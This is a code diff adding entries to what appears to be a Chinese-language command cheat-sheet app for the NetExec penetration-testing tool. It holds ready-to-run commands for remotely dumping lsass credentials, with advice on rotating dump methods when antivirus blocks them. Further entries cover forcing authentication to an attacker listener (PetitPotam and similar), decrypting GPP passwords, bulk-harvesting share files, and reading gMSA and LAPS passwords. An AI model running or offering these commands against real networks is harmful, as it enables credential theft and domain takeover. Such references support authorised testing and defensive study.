@@ -221,6 +221,77 @@ impacket-ntlmrelayx 的 -tf 目标文件。`,
     ],
   },
   {
+    id: 'nxc-smb-mods',
+    name: 'NetExec SMB — 高频模块',
+    category: 'netexec',
+    homepage: 'https://www.netexec.wiki/smb-protocol/list-modules',
+    description: '使用频率最高的 -M 模块：lsass 转储、GPP 密码、强制认证触发 (-L 列出全部模块，--options 查看模块参数)',
+    commands: [
+      {
+        id: 'nxc-smb-lsassy',
+        title: 'lsassy 远程转储 lsass',
+        description: '-M lsassy 远程 dump lsass 并用 lsassy 解析出明文/哈希 (需管理员)',
+        build: (p) => `${buildNetExecAuth(p, 'smb')} -M lsassy`,
+        usage: `-M lsassy  远程转储 lsass 进程内存并解析凭据 (需管理员权限)。
+模块参数 (-o KEY=VAL):
+  METHOD=1-5      dump 方法 (1=comsvcs.dll 直接读 / 2=procdump 落地等)
+  TMP_DIR=PATH    落地临时目录;DUMP_NAME=NAME  dump 文件名
+  默认优先不落盘方法, 是传统 mimikatz 远程方案的常用替代。
+同类备选: -M nanodump / -M procdump / -M handlekatz (AV 拦截时轮换)。`,
+        example: 'nxc smb 192.168.1.10 -u administrator -d corp.local -p Password123 -M lsassy',
+      },
+      {
+        id: 'nxc-smb-nanodump',
+        title: 'nanodump 转储 lsass (AV 规避)',
+        description: '-M nanodump 用 nanodump 分叉/快照技术 dump lsass，pypykatz 解析，规避部分 AV 对 comsvcs 的监控',
+        build: (p) => `${buildNetExecAuth(p, 'smb')} -M nanodump`,
+        usage: `-M nanodump  使用 nanodump (fork/snapshot) 转储 lsass 并用 pypykatz 解析。
+相比 lsassy 默认方法特征更少, lsassy 被 AV 拦时的首选备选;
+-M handlekatz / -M procdump 为另两种 lsass dump 路径, 可轮换测试。`,
+        example: 'nxc smb 192.168.1.10 -u administrator -d corp.local -H 31d6cfe0d16ae931b73c59d7e0c089c0 -M nanodump',
+      },
+      {
+        id: 'nxc-smb-coerce-plus',
+        title: 'coerce_plus 强制认证',
+        description: '-M coerce_plus 检测并触发全部可用强制认证原语 (PetitPotam/PrinterBug/DFSCoerce 等)，配合 responder/ntlmrelayx',
+        build: (p) => `${buildNetExecAuth(p, 'smb')} -M coerce_plus -o LISTENER=${v(p.localIP, 'LHOST')}`,
+        usage: `-M coerce_plus  检测目标存在的全部强制认证漏洞并触发回连 (低权限即可)。
+模块参数:
+  -o LISTENER=IP   回连监听 IP (必填, 通常是你的攻击机; 填 本地 IP 字段)
+  -o METHOD=NAME   只用指定方法 (如 PetitPotam);-o ALWAYS=true 无凭据也尝试
+流程: responder -I tun0 / impacket-ntlmrelayx 先起监听 -> 本模块触发 ->
+捕获机器账户 NTLMv2 做哈希破解或 Relay (配合 --gen-relay-list 选目标)。
+注意: 旧版独立模块 petitpotam/dfscoerce/shadowcoerce 已并入本模块。`,
+        example: 'nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 -M coerce_plus -o LISTENER=192.168.1.50',
+      },
+      {
+        id: 'nxc-smb-gpp-password',
+        title: 'GPP 组策略密码 (gpp_password / gpp_autologin)',
+        description: '解密域共享 SYSVOL 中 GPP 推送的 cpassword 明文与 autologon 凭据 (低权限可读)',
+        build: (p) => `${buildNetExecAuth(p, 'smb')} -M gpp_password`,
+        usage: `-M gpp_password    检索 SYSVOL 中 GPP (Groups.xml/ScheduledTasks.xml 等)
+  里的 cpassword 并用微软公开的 AES 密钥解密出明文
+  -M gpp_autologin   检索 registry.xml 中的自动登录凭据
+  -M gpp_privileges  解析 GPO 分配的特权 (找 SeImpersonate 等危险授权)
+低权限域用户即可对 DC 执行, 是老域环境中极高命中率的凭据来源。`,
+        example: 'nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 -M gpp_password',
+      },
+      {
+        id: 'nxc-smb-spider-plus',
+        title: 'spider_plus 共享文件收割',
+        description: '-M spider_plus 递归遍历所有可读共享，按扩展名白名单批量下载敏感文件',
+        build: (p) => `${buildNetExecAuth(p, 'smb')} -M spider_plus -o DOWNLOAD_FLAG=true -o EXT=txt,xml,config,ps1,bat,kdbx`,
+        usage: `-M spider_plus  递归列出所有共享文件元数据 (JSON 存 OUTPUT_FOLDER)。
+模块参数:
+  -o DOWNLOAD_FLAG=true   实际下载文件 (默认只列元数据)
+  -o EXT=txt,xml,...      下载的扩展名白名单
+  -o MAX_FILE_SIZE=51200  单文件大小上限 (字节);-o OUTPUT_FOLDER=PATH 输出目录
+是手工 --spider 的批量版, 适合广撒网找配置文件/脚本里的硬编码凭据。`,
+        example: 'nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 -M spider_plus -o DOWNLOAD_FLAG=true',
+      },
+    ],
+  },
+  {
     id: 'nxc-ldap',
     name: 'NetExec LDAP — 枚举与 BloodHound',
     category: 'netexec',
@@ -292,14 +363,39 @@ AS-REP 哈希,hashcat -m 18200 破解;
       },
       {
         id: 'nxc-ldap-gmsa',
-        title: '读取 gMSA 密码',
-        description: '--gmsa 读取有权限账户的 gMSA 托管密码并算出 NT 哈希',
+        title: '读取 gMSA 密码 (--gmsa)',
+        description: '--gmsa 读取有权限账户的 gMSA 托管密码并算出 NT 哈希 (自动走 LDAPS)',
         build: (p) => `${buildNetExecAuth(p, 'ldap')} --gmsa`,
         usage: `--gmsa                      枚举并解密有权限读取的 gMSA 密码 (输出 NT 哈希)
   --gmsa-convert-id <id>    转换指定 gMSA 的密钥 ID
   --gmsa-decrypt-lsa <值>   解密来自 LSA 的 gMSA 密文
-前提: 当前账户在 gMSA 的 PrincipalsAllowedToRetrieveManagedPassword 中。`,
+前提: 当前账户在 gMSA 的 PrincipalsAllowedToRetrieveManagedPassword 中
+(BloodHound 中表现为 ReadGMSAPassword 边)。
+注意: gMSA 密码读取要求安全 LDAP 连接, --gmsa 会自动选用 LDAPS (636);
+若报 operationsError 0000202D (UNABLE_TO_PROCEED), 显式加 --port 636 重试。
+补充: NetExec 没有 -M readgmsa 模块, gMSA 读取由 LDAP 协议原生 --gmsa 系列参数提供。`,
         example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --gmsa',
+      },
+      {
+        id: 'nxc-ldap-gmsa-convert-id',
+        title: 'gMSA 密钥 ID 转换 (--gmsa-convert-id)',
+        description: '把 LSA/其他来源拿到的 gMSA 密钥 ID 转换为可解密的 secret 名称',
+        build: (p) => `${buildNetExecAuth(p, 'ldap')} --gmsa-convert-id ${v('', 'KEY_ID')}`,
+        usage: `--gmsa-convert-id <id>  转换指定 gMSA 的密钥 ID; 不传值则列出全部 gMSA。
+配合场景: 从 LSA Secrets ($MACHINE.ACC / _SC_GMSA_) 或内存中拿到 gMSA 的
+msDS-ManagedPasswordId 后, 先转换为 secret 名称再解密。`,
+        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724',
+      },
+      {
+        id: 'nxc-ldap-gmsa-decrypt-lsa',
+        title: '解密 LSA 中的 gMSA 密文 (--gmsa-decrypt-lsa)',
+        description: '直接解密从目标 LSA Secrets 导出的 _SC_GMSA_ 密文 blob，得到 gMSA NT 哈希',
+        build: (p) => `${buildNetExecAuth(p, 'ldap')} --gmsa-decrypt-lsa ${q(v('', '_SC_GMSA_{...}'))}`,
+        usage: `--gmsa-decrypt-lsa <值>  解密来自 LSA 的 gMSA 密文, 值为导出的
+_SC_GMSA_{...} 整段字符串 (注意用单引号包裹, 内含特殊字符)。
+流程: 先用 --lsa / secretsdump 导出目标 LSA Secrets, 找到 _SC_GMSA_ 条目,
+再用本参数离线解密出 gMSA 的 NT 哈希。`,
+        example: "nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8B-...}'",
       },
       {
         id: 'nxc-ldap-admin-count',
@@ -331,6 +427,29 @@ AS-REP 哈希,hashcat -m 18200 破解;
   --query "(servicePrincipalName=*)" "sAMAccountName,servicePrincipalName"
   --query "(&(objectClass=user)(description=*))" "sAMAccountName,description"`,
         example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --query "(servicePrincipalName=*)" "sAMAccountName,servicePrincipalName"',
+      },
+      {
+        id: 'nxc-ldap-laps',
+        title: '读取 LAPS 密码 (模块)',
+        description: '-M laps 检索当前账户有权读取的计算机本地管理员 LAPS 密码',
+        build: (p) => `${buildNetExecAuth(p, 'ldap')} -M laps`,
+        usage: `-M laps  枚举并解密当前账户有权限读取的 LAPS 本地管理员密码
+(ms-Mcs-AdmPwd / msLAPS-Password 属性, 自动处理加密 LAPS)。
+模块参数: -o COMPUTER=NAME 只查指定主机。
+前提: 账户对目标计算机有 LAPS 密码属性的读权限
+( BloodHound 中表现为 ReadLAPSPassword 边 )。`,
+        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 -M laps',
+      },
+      {
+        id: 'nxc-ldap-maq',
+        title: '查 MachineAccountQuota (模块)',
+        description: '-M maq 读取 ms-DS-MachineAccountQuota，判断普通用户能否创建机器账户 (RBCD/资源委派攻击前提)',
+        build: (p) => `${buildNetExecAuth(p, 'ldap')} -M maq`,
+        usage: `-M maq  读取域级 ms-DS-MachineAccountQuota 属性 (默认 10)。
+值 >0 表示任意域用户可创建机器账户——是 RBCD 委派攻击、
+Shadow Credentials、noPac (CVE-2021-42278) 等利用链的共同前提。
+同族低权限模块: -M get-desc-users (用户描述里的密码) / -M pso (细粒度密码策略)。`,
+        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 -M maq',
       },
       {
         id: 'nxc-ldap-adcs',
